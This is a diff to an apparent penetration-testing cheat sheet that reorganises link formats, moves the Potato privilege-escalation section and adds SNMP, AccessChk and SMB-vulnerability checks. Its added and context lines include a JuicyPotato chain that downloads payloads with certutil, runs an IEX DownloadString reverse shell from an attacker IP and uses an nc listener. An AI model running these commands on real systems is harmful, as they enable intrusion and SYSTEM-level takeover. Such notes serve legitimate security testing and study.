@@ -66,7 +66,7 @@ $ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_ST
 
 Invoke-Expression (UTF-16LE):
 
-1. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+1. [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
 ```
 $ echo -n "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/[1]')" | iconv -t UTF-16LE | base64 -w0; echo
@@ -75,7 +75,7 @@ PS > powershell -NoP -EncodedCommand <BASE64_COMMAND_HERE>
 
 Invoke-WebRequest + `nc.exe` **[1]**:
 
-1. [eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)
+1. [https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)
 
 ```
 PS > powershell -NoP IWR -Uri http://127.0.0.1/nc.exe -OutFile C:\Windows\Temp\nc.exe
@@ -104,7 +104,7 @@ PS > Start-Process "$env:TEMP\met.exe"
 
 PowerShell + unicorn **[1]**:
 
-1. [github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
+1. [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
 ```
 $ ./unicorn.py windows/meterpreter/reverse_https LHOST 443
@@ -252,7 +252,7 @@ $client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("h
 ```
 # Sender:
 root@kali:$ tar -zcvf folder.tar.gz folder
-root@kali:$ nc -w3 -lvnp 1234 < file.txt
+root@kali:$ nc -w3 -lvnp 1234 < folder.tar.gz
 # Recipient:
 www-data@victim:$ bash -c 'cat < /dev/tcp/127.0.0.1/1234 > .folder.tar.gz'
 www-data@victim:$ tar -zxvf .folder.tar.gz
@@ -297,7 +297,7 @@ SMB server (communicate with Windows **[1]**):
 $ smbserver.py -smb2support files `pwd`
 ```
 
-1. [serverfault.com/a/333584/554483](https://serverfault.com/a/333584/554483)
+1. [https://serverfault.com/a/333584/554483](https://serverfault.com/a/333584/554483)
 
 Mount SMB in Windows with `net use`:
 
@@ -459,7 +459,7 @@ $ sudo nmap -sV --script=rpcinfo 10.10.10.0/24 -p111
 Run Nmap scripts:
 
 ```
-$ sudo nmap --scripts nfs* 10.10.10.0/24 -p111
+$ sudo nmap --script='nfs*' 10.10.10.0/24 -p111
 ```
 
 
@@ -468,10 +468,35 @@ $ sudo nmap --scripts nfs* 10.10.10.0/24 -p111
 ## Mount
 
 * [https://resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)
+* [https://blog.christophetd.fr/write-up-vulnix/](https://blog.christophetd.fr/write-up-vulnix/)
 
 ```
 $ showmount -e 10.10.13.37
-$ sudo mount -v -t nfs -o nolock -o user=snovvcrash,[pass='Passw0rd!'] 10.10.13.37:/home /mnt/nfs
+$ sudo mount -v -t nfs -o vers=3 -o nolock -o user=snovvcrash,[pass='Passw0rd!'] 10.10.13.37:/home /mnt/nfs
+```
+
+
+
+
+
+# SNMP
+
+
+
+
+## onesixtyone
+
+```
+$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.13.37
+```
+
+
+
+
+## snmp-check
+
+```
+$ snmp-check -v 2c -c public 10.10.13.37
 ```
 
 
@@ -623,7 +648,6 @@ Enumerate all AD Computers:
 $ nmap -n -Pn --script=ldap-rootdse 127.0.0.1 -p389
 $ nmap -n -Pn --script=ldap-search 127.0.0.1 -p389
 $ nmap -n -Pn --script=ldap-brute 127.0.0.1 -p389
-$ nmap -p 139,445 --script=/usr/share/nmap/scripts/smb-os-discovery --script-args=unsafe=1 127.0.0.1
 ```
 
 
@@ -1154,7 +1178,7 @@ InheritanceFlags      : None
 PropagationFlags      : None
 ```
 
-`CreateChild` permission is what we need.
+This `CreateChild` permission is what we need.
 
 2\. Create, configure the new DNS name that could be likely exploited for spoofing with Attacker's IP and enable it. I chose `pc01` which was found in DNS cache:
 
@@ -1679,6 +1703,53 @@ PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_N
 
 
 
+## SeImpersonatePrivilege
+
+
+
+### Potatoes
+
+* [https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
+
+
+#### foxglovesec/RottenPotato
+
+* [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
+* [https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
+* [https://github.com/foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato)
+
+```
+$ curl -L https://github.com/foxglovesec/RottenPotato/blob/master/rottenpotato.exe > r.exe
+meterpreter > upload r.exe
+meterpreter > load incognito
+meterpreter > execute -cH -f rottenpotato.exe
+meterpreter > list_tokens -u
+meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
+```
+
+
+#### decoder/the-lonely-potato
+
+* [https://decoder.cloud/2017/12/23/the-lonely-potato/](https://decoder.cloud/2017/12/23/the-lonely-potato/)
+
+
+#### ohpe/juicy-potato
+
+* [github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
+* [ohpe.it/juicy-potato/CLSID](https://ohpe.it/juicy-potato/CLSID)
+
+```
+$ curl -L https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe > j.exe
+$ curl -L https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcp.ps1 > rev.ps1
+Cmd > certutil -urlcache -split -f http://10.10.13.37/j.exe C:\Windows\System32\spool\drivers\color\j.exe
+Cmd > echo cmd /c powershell -exec bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/rev.ps1')" > rev.bat
+$ sudo rlwrap nc -lvnp 443
+Cmd > .\j.exe -l 443 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
+```
+
+
+
+
 ## SeBackupPrivilege
 
 
@@ -2090,14 +2161,6 @@ PS > .\SharpDPAPI.exe machinetriage /password:Passw0rd!
 
 
 
-## Obfuscate Mimikatz
-
-* [https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/](https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/)
-* [https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/)
-
-
-
-
 
 # NTLM
 
@@ -2482,6 +2545,14 @@ PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.
 
 
 
+## Obfuscate Mimikatz
+
+* [https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/](https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/)
+* [https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/)
+
+
+
+
 
 # Metasploit
 
@@ -2570,8 +2641,8 @@ msf auxiliary(server/socks_proxy) > run -j
 
 ## Debug
 
-1. [github.com/deivid-rodriguez/pry-byebug](https://github.com/deivid-rodriguez/pry-byebug)
-2. [www.youtube.com/watch?v=QzP5nUEhZeg&t=2190](https://www.youtube.com/watch?v=QzP5nUEhZeg&t=2190)
+1. [https://github.com/deivid-rodriguez/pry-byebug](https://github.com/deivid-rodriguez/pry-byebug)
+2. [https://www.youtube.com/watch?v=QzP5nUEhZeg&t=2190](https://www.youtube.com/watch?v=QzP5nUEhZeg&t=2190)
 
 ```
 $ gem install pry-byebug
@@ -2871,9 +2942,9 @@ $ sudo python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
 
 ## Chisel
 
-1. [github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
-2. [0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel)
-3. [snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks](https://snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks)
+1. [https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
+2. [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel)
+3. [https://snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks](https://snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks)
 
 * Attacker's IP: `10.10.13.37`
 * Victims's IP: `192.168.0.20`
@@ -3004,6 +3075,11 @@ find / -type f -perm /6000 -ls 2>/dev/null
 ```
 
 
+#### linPEAS
+
+* [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)
+
+
 
 ### Rootkits
 
@@ -3080,61 +3156,49 @@ PS > reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Inte
 
 
 
+### AccessChk
+
+* [https://www.fuzzysecurity.com/tutorials/16.html](https://www.fuzzysecurity.com/tutorials/16.html)
+* [https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
+* [https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/](https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/)
+
+Find weak file permissions:
+
+```
+Cmd > .\accesschk.exe /accepteula -uwsq Users c:\*.*
+Cmd > .\accesschk.exe /accepteula -uwsq "Authenticated Users" c:\*.*
+```
+
+Find weak directory permissions:
+
+```
+Cmd > .\accesschk.exe /accepteula -uwdsq Users c:\
+Cmd > .\accesschk.exe /accepteula -uwdsq "Authenticated Users" c:\
+```
+
+Find weak service permissions:
+
+```
+.\accesschk.exe /accepteula -uwcqv Users *
+.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+```
+
+
+#### upnphost & SSDPSRV (Windows XP)
+
+* [https://sohvaxus.github.io/content/winxp-sp1-privesc.html](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)
+* [PayloadsAllTheThings/Example with Windows XP SP0/SP1 - upnphost](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#example-with-windows-xp-sp1---upnphost)
+* [https://www.exploit-db.com/exploits/1465](https://www.exploit-db.com/exploits/1465)
+* [http://www.tarasco.org/security/srvcheck/index.html](http://www.tarasco.org/security/srvcheck/index.html)
+
+
+
 ### SDDL
 
 * [https://habr.com/ru/company/pm/blog/442662/](https://habr.com/ru/company/pm/blog/442662/)
 * [0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html](https://0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html)
 * [0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html](https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html)
 * [https://security-tzu.com/2020/11/01/setobjectsecurity-exe-sddl/](https://security-tzu.com/2020/11/01/setobjectsecurity-exe-sddl/)
-
-
-
-### Potatoes
-
-* [https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
-
-
-#### foxglovesec/RottenPotato
-
-* [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
-
-```
-meterpreter > upload [3]
-meterpreter > load incognito
-meterpreter > execute -cH -f rottenpotato.exe
-meterpreter > list_tokens -u
-meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
-```
-
-1. [github.com/foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato)
-2. [foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
-3. [github.com/foxglovesec/RottenPotato/blob/master/rottenpotato.exe](https://github.com/foxglovesec/RottenPotato/blob/master/rottenpotato.exe)
-
-
-#### decoder/the-lonely-potato
-
-* [https://decoder.cloud/2017/12/23/the-lonely-potato/](https://decoder.cloud/2017/12/23/the-lonely-potato/)
-
-
-#### ohpe/juicy-potato
-
-```
-Cmd > certutil -urlcache -split -f http://127.0.0.1/[3] C:\Windows\System32\spool\drivers\color\j.exe
-Cmd > certutil -urlcache -split -f http://127.0.0.1/rev.bat C:\Windows\System32\spool\drivers\color\rev.bat
-$ nc -lvnp 443
-Cmd > j.exe -l 443 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
-```
-
-```bat
-;= rem rev.bat
-
-cmd /c powershell -NoP IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/[4]')
-```
-
-1. [github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
-2. [ohpe.it/juicy-potato/CLSID](https://ohpe.it/juicy-potato/CLSID)
-3. [github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
-4. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
 
 
@@ -3465,8 +3529,8 @@ $ wget [1] -O redis-cli-go && chmod +x redis-cli-go
 $ ln -s ~/tools/redis-cli-go/redis-cli-go /usr/local/bin/redis-cli-go && cd -
 ```
 
-1. [github.com/holys/redis-cli/releases](https://github.com/holys/redis-cli/releases)
-2. [github.com/antirez/redis](https://github.com/antirez/redis)
+1. [https://github.com/holys/redis-cli/releases](https://github.com/holys/redis-cli/releases)
+2. [https://github.com/antirez/redis](https://github.com/antirez/redis)
 
 Check if vulnarable:
 
@@ -4194,6 +4258,14 @@ PS > Invoke-Portscan -Hosts 127.0.0.1 -Ports 21,22,23,25,53,80,88,111,135,137,13
 
 
 
+### Raw Identification
+
+```
+$ nc -nv 10.10.13.37 4444 [-C]
+```
+
+
+
 ### Nmap XML Parsers
 
 `parsenmap.rb`:
@@ -4378,7 +4450,7 @@ Top UDP ports:
 | 3391 | RD Gateway |
 
 ```
-$ sudo masscan --rate=500 --open -p21,22,23,25,53,80,88,111,135,137,139,161,389,443,445,464,500,593,636,873,1099,1433,1521,2049,3268,3269,3306,3389,4786,5432,5555,5900,5985,5986,6379,8080,9389,9200,27017,U:161,U:500 -iL routes.txt --resume paused.conf >> masscan.out
+$ sudo masscan [-e eth0] --rate=500 --open -p21,22,23,25,53,80,88,111,135,137,139,161,389,443,445,464,500,593,636,873,1099,1433,1521,2049,3268,3269,3306,3389,4786,5432,5555,5900,5985,5986,6379,8080,9389,9200,27017,U:161,U:500 -iL routes.txt --resume paused.conf >> masscan.out
 $ mkdir services && for p in 21 22 23 25 53 80 88 111 135 137 139 161 389 443 445 464 500 593 636 873 1099 1433 1521 2049 3268 3269 3306 3389 4786 5432 5555 5900 5985 5986 6379 8080 9389 9200 27017; do grep "port $p/tcp" masscan.out | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
 ```
 
@@ -4485,6 +4557,17 @@ msf > use auxiliary/scanner/netbios/nbname
 
 ## LHF Checkers & Exploits
 
+Check for SMB vulnerablities with NSE:
+
+```
+$ sudo nmap --script-args=unsafe=1 --script=smb-os-discovery 10.10.13.37 -p139,445
+$ sudo nmap -n -Pn --script='smb-vuln*' 10.10.13.37 -p445
+```
+
+Exploit MS08-067 and MS17-010 without MSF:
+
+* [https://0xdf.gitlab.io/2019/02/21/htb-legacy.html](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html)
+
 
 
 ### net_api
@@ -4495,6 +4578,8 @@ msf > use auxiliary/scanner/netbios/nbname
 #### Check
 
 ```
+$ sudo nmap -n -Pn --script=smb-vuln-ms08-067 10.10.13.37 -p445
+
 msf > use exploit/windows/smb/ms08_067_netapi
 msf > check
 ```
@@ -4517,6 +4602,8 @@ msf > exploit
 #### Check
 
 ```
+$ sudo nmap -n -Pn --script=smb-vuln-ms17-010 10.10.13.37 -p445
+
 msf > use auxiliary/scanner/smb/smb_ms17_010
 ```
 
@@ -6793,8 +6880,8 @@ $ service systemd-timesyncd status
 $ service systemd-timedated status
 ```
 
-1. [feeding.cloud.geek.nz/posts/time-synchronization-with-ntp-and-systemd/](https://feeding.cloud.geek.nz/posts/time-synchronization-with-ntp-and-systemd/)
-2. [billauer.co.il/blog/2019/01/ntp-systemd/](http://billauer.co.il/blog/2019/01/ntp-systemd/)
+1. [https://feeding.cloud.geek.nz/posts/time-synchronization-with-ntp-and-systemd/](https://feeding.cloud.geek.nz/posts/time-synchronization-with-ntp-and-systemd/)
+2. [http://billauer.co.il/blog/2019/01/ntp-systemd/](http://billauer.co.il/blog/2019/01/ntp-systemd/)
 
 
 
@@ -6828,7 +6915,7 @@ tar -cvf directory.tar directory
 Unpack:
 
 ```
-tar -xvf directory.tar directory
+tar -xvf directory.tar
 ```
 
 
@@ -6843,7 +6930,7 @@ tar -cvzf directory.tar.gz directory
 Unpack:
 
 ```
-tar -xvzf directory.tar.gz directory
+tar -xvzf directory.tar.gz
 ```
 
 
@@ -6858,7 +6945,7 @@ tar -cvjf directory.tar.bz directory
 Unpack:
 
 ```
-tar -xvjf directory.tar.bz directory
+tar -xvjf directory.tar.bz
 ```
 
 
